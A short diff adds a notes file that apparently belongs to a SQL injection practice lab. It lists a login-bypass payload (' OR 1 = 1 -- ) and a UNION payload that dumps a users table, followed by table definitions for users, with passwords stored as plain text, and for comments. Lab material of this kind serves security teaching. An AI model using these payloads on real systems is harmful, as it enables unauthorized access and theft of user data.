@@ -1,0 +1,26 @@
+1. Login payload
+username : ' OR 1 = 1 -- 
+password : <anything>
+-------------------------------------------
+
+2.search payload
+' UNION select * from users; -- 
+
+------------- creating tables -------------
+
+create table users(
+    id int auto_increment,
+    name varchar(30),
+    email varchar(50),
+    password varchar(30),
+    primary key(id)
+);
+
+create table comments(
+    id int auto_increment,
+    title varchar(30),
+    text varchar(30),
+    username varchar(30),
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    primary key(id)
+);
